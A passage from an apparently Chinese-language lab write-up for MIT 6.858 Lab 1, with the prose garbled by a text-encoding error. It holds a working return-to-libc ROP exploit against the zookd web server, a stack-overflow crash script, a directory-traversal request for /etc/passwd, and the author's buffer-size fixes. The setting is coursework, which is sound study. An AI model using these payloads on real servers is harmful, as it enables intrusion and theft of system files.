ˆåº•é—´çš„è·ç¦»</p><p>ä¿¡æ¯æ³„éœ²è¿™ä¸€æ­¥æ¯”è¾ƒéš¾å¼„ï¼Œäºæ˜¯ç¬”è€…çœ‹äº†çœ‹å…¶ä»–äººçš„åšæ³•ï¼Œå‘ç°**å¤§å®¶éƒ½æ˜¯ç›´æ¥ç”¨ gdb çœ‹ç¨‹åºä»¥åŠ libc çš„åŸºå€â€¦**ï¼ˆ<del>ğŸ‘´å¯»æ€è¿™â‘ ä¸¶ä¹Ÿâ‘§å®æˆ˜å•Šï¼Œ</del>ä¼°è®¡æ˜¯ä¸ºäº†æ•™å­¦ç›®çš„é™ä½äº†éš¾åº¦ï¼‰</p><blockquote><p>ç¬”è€…æƒ³äº†å¤§åŠå¤©æ€ä¹ˆæ„å»º ROPã€æ€ä¹ˆæ³„éœ² libc åœ°å€ã€é€†äº†åŠå¤©ç¨‹åºæ‰¾å¯ç”¨çš„ gadgetï¼Œæœ€åæ‰çŸ¥é“è¿™ä¸ªå®éªŒæ˜¯ç›´æ¥ç”¨ gdb æŸ¥çœ‹ç¨‹åºä»£ç æ®µ+libc çš„åœ°å€â€¦<del>æŒºæ— è¯­çš„å…¶å®</del></p></blockquote><p>é‚£ç¬”è€…åªå¥½ä¹Ÿè¿™ä¹ˆåšäº†ï¼ˆç¬‘ï¼‰ï¼Œè™½ç„¶è¯´ä»–æä¾›äº†ä¸€ä¸ªè«åå…¶å¦™çš„ <code>accidentially()</code> å‡½æ•°ä½†æ˜¯ç¬”è€…é€‰æ‹©ç›´æ¥å¿½ç•¥ï¼Œéšä¾¿æ‰¾ç¨‹åºä¸­çš„ä¸€ä¸ª <code>ret</code> æ„é€ æ»‘æ¿åé¢è·Ÿ ROP é“¾å³å¯ï¼Œå› ä¸ºè¿™ä¸ª Exercise è¯´å®è¯åšèµ·æ¥è«åå…¶å¦™çš„æ‰€ä»¥ç¬”è€…ä¹Ÿç”¨è«åå…¶å¦™çš„è§£æ³•å¥½äº†ï¼ˆç¬‘ï¼‰ï¼Œè¿™é‡Œé…åˆ ROPgadget æ‰¾äº†ä¸€äº› gadget éšä¾¿å‡‘äº†ä¸€ä¸ªå¯ç”¨çš„ ROP chainï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>    <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br><br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br><br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br><br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br><br>    <span class="hljs-keyword">return</span> req<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br>    sock.send(get_malicious_request())<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>ç¬”è€…çš„è§£æ³•ç®€å•æ¥è¯´æ˜¯ç”¨ malloc æ¥åˆ†é…ä¸€ä¸ª chunk å¾€ä¸Šé¢å†™å­—ç¬¦ä¸²ï¼Œä¹‹å <code>unlink(chunk)</code> å³å¯</p><p><img src="https://s2.loli.net/2022/12/04/O5euynk9jE3GoH7.png" alt="image.png"></p><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-libc</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡âˆš</p><p><img src="https://s2.loli.net/2022/12/04/ElDbUBFJ3rqatNW.png" alt="image.png"></p><p>ç„¶åæ˜¯ä¸€ä¸ª <em>Challenge</em> ï¼Œ<strong>åœ¨ä¸ä¾èµ– <code>accidentally()</code> å‡½æ•°çš„æƒ…å†µä¸‹æ„é€  ROP</strong>ï¼Œæç¤ºäº†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ROPgadget æ¥å¯»æ‰¾ gadget ï¼š</p><blockquote><p><em>Challenge! (optional)</em> The <code>accidentally</code> function is a bit artificial. For extra credit, figure out how to perform the return-to-libc attack without relying on that function (delete it and find another way to make your exploit work). Provide your attack in <code>exploit-challenge.py</code>. Also, briefly explain the attack and provide ROP gadgets you use in <code>answers.txt</code>.</p><p>You will need to find another chunk of code to reuse that gives you control over <code>%rdi</code>. You can read through the disassembly (e.g. using <code>objdump</code>) to look for useful ROP gadgets.</p><p>Because of the nature of x86&#x2F;x86-64, you can use another technique to find sequences of instructions that donâ€™t even appear in the disassembly! Instructions are variable-length (from 1 to 15 bytes), and by causing a misaligned parse (by jumping into the middle of an intended instruction), you can cause a sequence of machine code to be misinterpreted. For example, the instruction sequence <code>pop %r15; ret</code> corresponds to the machine code <code>41 5F C3</code>. But instead of executing from the start of this instruction stream, if you jump 1 byte in, the machine code <code>5F C3</code> corresponds to the assembly <code>pop %rdi; ret</code>.</p><p>Automated tools such as <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget.py</a> can assist you in searching for ROP gadgets, even finding gadgets that arise from misaligned parses. The 6.858 VM already has <code>ROPgadget</code> installed.</p><p>You may find it useful to search for ROP gadgets not just in the <code>zookd</code> binary but in other libraries that <code>zookd</code> loads at runtime. To see these libraries, and the addresses at which they are loaded, you can run <strong>( ulimit -s unlimited &amp;&amp; setarch -R ldd zookd-nxstack )</strong>. The <code>ulimit</code> and <code>setarch</code> commands set up the same environment used by <code>clean-env.sh</code>, so that <code>ldd</code> prints the same addresses that will be used at runtime.</p></blockquote><p>ç¬”è€…ä¸€å¼€å§‹çš„æ€è·¯å°±æ˜¯ä¸ç”¨  <code>accidentally()</code> ï¼ˆéå¸¸è«åå…¶å¦™çš„ä¸€ä¸ªå‡½æ•°ï¼‰ï¼Œæ‰€ä»¥ç­‰äºæ˜¯ç›´æ¥é€šè¿‡äº†ï¼ˆç¬‘ï¼‰</p><h2 id="Part-4-Fixing-buffer-overflows-and-other-bugs"><a href="#Part-4-Fixing-buffer-overflows-and-other-bugs" class="headerlink" title="Part 4: Fixing buffer overflows and other bugs"></a>Part 4: Fixing buffer overflows and other bugs</h2><p>è¿™ä¸€å—å°±æ˜¯ä¸¤ä¸ª Exerciseï¼Œ å…ˆçœ‹ Exercise 6ï¼Œè®©æˆ‘ä»¬å¯»æ‰¾ç¨‹åºä¸­çš„å…¶ä»–æ¼æ´ï¼ˆè‡³å°‘ä¸¤ä¸ªï¼Œé™¤äº† <code>zoobar</code> ä¸­çš„ä»¥å¤–ï¼Œé‚£ä¸ªæ˜¯ç•™ç»™æœªæ¥çš„å…¶ä»– labs çš„ï¼‰ï¼š</p><blockquote><p><strong>Exercise 6.</strong> Look through the source code and try to find more vulnerabilities that can allow an attacker to compromise the security of the web server. Describe the attacks you have found in <code>answers.txt</code>, along with an explanation of the limitations of the attack, what an attacker can accomplish, why it works, and how you might go about fixing or preventing it. You should ignore bugs in <code>zoobar</code>â€˜s code. They will be addressed in future labs.</p><p>One approach for finding vulnerabilities is to trace the flow of inputs controlled by the attacker through the server code. At each point that the attackerâ€™s input is used, consider all the possible values the attacker might have provided at that point, and what the attacker can achieve in that manner.</p><p>You should find at least two vulnerabilities for this exercise.</p></blockquote><p><del>æºç å®¡è®¡è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä½†æ˜¯</del>ç¬”è€…å®¡äº†å¤§åŠå¤©å¥½åƒä¹Ÿæ²¡æ‰¾åˆ°é™¤äº†ä¸Šé¢çš„ bug ä»¥å¤–çš„ bugï¼Œè¿˜å¥½åé¢è¿˜æ˜¯æ‰¾åˆ°äº†ä¸€äº›</p><p>é¦–å…ˆæ˜¯åœ¨ <code>process_client()</code> ä¸­å­˜å‚¨è¯·æ±‚ URL çš„é•¿åº¦çš„ä½ç½®å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œå› ä¸ºä¸€æ¬¡æœ€å¤šä¸€è¡Œè¯» 8192 å­—èŠ‚ï¼Œä½†è¿™é‡Œæ˜æ˜¾æ²¡æœ‰é¢„ç•™è¶³å¤Ÿçš„ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<span class="hljs-comment">// åªç•™äº†4096å­—èŠ‚</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span> <span class="hljs-comment">// è¿™é‡Œä¸€æ¬¡æœ€å¤šè¯» 8192 å­—èŠ‚</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br></code></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> * <span class="hljs-number">768</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>æˆåŠŸ crashï¼Œä¸è¿‡è¿™é‡Œå¹¶éå› ä¸ºéæ³•è¿”å›åœ°å€ crashï¼Œè€Œæ˜¯å› ä¸ºæˆ‘ä»¬è¦†å†™æ‰äº†æ ˆä¸Šçš„ <code>errmsg</code> å˜é‡å¯¼è‡´éæ³•å†…å­˜å¼•ç”¨ä»è€Œ crash</p><p><img src="https://s2.loli.net/2022/12/04/t9vq36KXmZOIslJ.png" alt="image.png"></p><p>ç¬¬äºŒä¸ªæ¼æ´æ˜¯åœ¨ <code>http_serve</code> ä¸­å­˜åœ¨ç›®å½•ç©¿è¶Šçš„é—®é¢˜ï¼Œç”±äºæ²¡æœ‰å¯¹è·¯å¾„åšè¿‡æ»¤åŠåˆ¤æ–­ï¼Œè¿™å¯ä»¥è®©æˆ‘ä»¬è®¿é—®åˆ°æœåŠ¡å™¨æ ¹ç›®å½•å¤–çš„æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = http_serve_none;<br>    <span class="hljs-type">char</span> pn[<span class="hljs-number">2048</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><br>    getcwd(pn, <span class="hljs-keyword">sizeof</span>(pn));<br>    setenv(<span class="hljs-string">&quot;DOCUMENT_ROOT&quot;</span>, pn, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(name) + <span class="hljs-built_in">strlen</span>(pn) + <span class="hljs-number">1</span> &gt;= <span class="hljs-keyword">sizeof</span>(pn)) &#123;<br>        http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;Request too long&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">strncat</span>(pn, name, <span class="hljs-keyword">sizeof</span>(pn) - <span class="hljs-built_in">strlen</span>(pn) - <span class="hljs-number">1</span>);<br>    split_path(pn);<br><br>    <span class="hljs-keyword">if</span> (!stat(pn, &amp;st))<br>    &#123;<br>        <span class="hljs-comment">/* executable bits -- run as CGI script */</span><br>        <span class="hljs-keyword">if</span> (valid_cgi_script(&amp;st))<br>            handler = http_serve_executable;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (S_ISDIR(st.st_mode))<br>            handler = http_serve_directory;<br>        <span class="hljs-keyword">else</span><br>            handler = http_serve_file;<br>    &#125;<br><br>    handler(fd, pn);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pn)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">if</span> ((filefd = open(pn, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;open %s: %s&quot;</span>, pn, strerror(errno));<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BSD</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">if</span> (!fstat(filefd, &amp;st))<br>        len = st.st_size;<br>    <span class="hljs-keyword">if</span> (sendfile(fd, filefd, <span class="hljs-number">0</span>, len) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">if</span> (sendfile(filefd, fd, <span class="hljs-number">0</span>, &amp;len, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;sendfile&quot;</span>);<br>    close(filefd);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•å†™ä¸ªè„šæœ¬æµ‹è¯•ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /../../../../etc/passwd&quot;</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;REQUEST_URI: &quot;</span> + <span class="hljs-string">b&quot;index.html&quot;</span>  + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>æˆåŠŸè®¿é—®åˆ° <code>/etc/passwd</code></p><p><img src="https://s2.loli.net/2022/12/04/dlv6JVCk91QhcyW.png" alt="image.png"></p><p>Exercise 6 é‡Œè¯´ <code>You should find at least two vulnerabilities for this exercise.</code> ï¼Œç¬”è€…å·²ç»æ‰¾è¶³ä¸¤ä¸ªï¼Œæ»¡è¶³äº†é¢˜ç›®è¦æ±‚ï¼Œå°±ä¸ç»§ç»­æ‰¾æ›´å¤šçš„äº†ï¼ˆç¬‘ï¼‰<del>ğŸ‘´é€‰æ‹©ç›´æ¥æ‘†å¤§çƒ‚</del></p><p>æ¥ä¸‹æ¥çœ‹æœ€åä¸€ä¸ª Exerciseï¼Œè®©æˆ‘ä»¬è¿›è¡Œæ¼æ´ä¿®å¤ï¼Œä¸»è¦æ˜¯ä¿®æ‰¾åˆ°çš„æ ˆæº¢å‡ºæ¼æ´ï¼š</p><blockquote><p><strong>Exercise 7.</strong> For each buffer overflow vulnerability you have exploited in Exercises 2, 4, and 5, fix the web serverâ€™s code to prevent the vulnerability in the first place. Do not rely on compile-time or runtime mechanisms such as <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">stack canaries</a>, removing <code>-fno-stack-protector</code>, baggy bounds checking, etc.</p><p>Make sure that your code actually stops your exploits from working. Use <strong>make check-fixed</strong> to run your exploits against your modified source code (as opposed to the staff reference binaries from <code>bin.tar.gz</code>). These checks should report FAIL (i.e., exploit no longer works). If they report PASS, this means the exploit still works, and you did not correctly fix the vulnerability.</p><p>Note that your submission should <em>not</em> make changes to the <code>Makefile</code> and other grading scripts. We will use our unmodified version during grading.</p><p>You should also make sure your code still passes all tests using <strong>make check</strong>, which uses the unmodified lab binaries.</p></blockquote><p>ä¸»è¦æ˜¯ä¿®è¿™ä¸¤ä¸ªåœ°æ–¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> value[<span class="hljs-number">8192</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼Œæ”»å‡»å…¨éƒ¨å¤±è´¥ä»£è¡¨æˆåŠŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-fixed</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡âˆš</p><p><img src="https://s2.loli.net/2022/12/04/6XNYjFW7BdPr1Re.png" alt="image.png"></p><p>è‡³æ­¤ï¼Œ Lab1 å…¨éƒ¨å®Œæˆ</p><h1 id="0x02-Lab-2-Privilege-separation-and-server-side-sandboxingï¼ˆuncompletedï¼‰"><a href="#0x02-Lab-2-Privilege-separation-and-server-side-sandboxingï¼ˆuncompletedï¼‰" class="headerlink" title="0x02.Lab 2: Privilege separation and server-side sandboxingï¼ˆuncompletedï¼‰"></a>0x02.Lab 2: Privilege separation and server-side sandboxingï¼ˆuncompletedï¼‰</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>è¿™ä¸€ä¸ª lab ä¸»è¦æ˜¯å…³äº <strong>æƒé™åˆ†ç¦»</strong> ï¼ˆprivilege separationï¼‰ä¸ 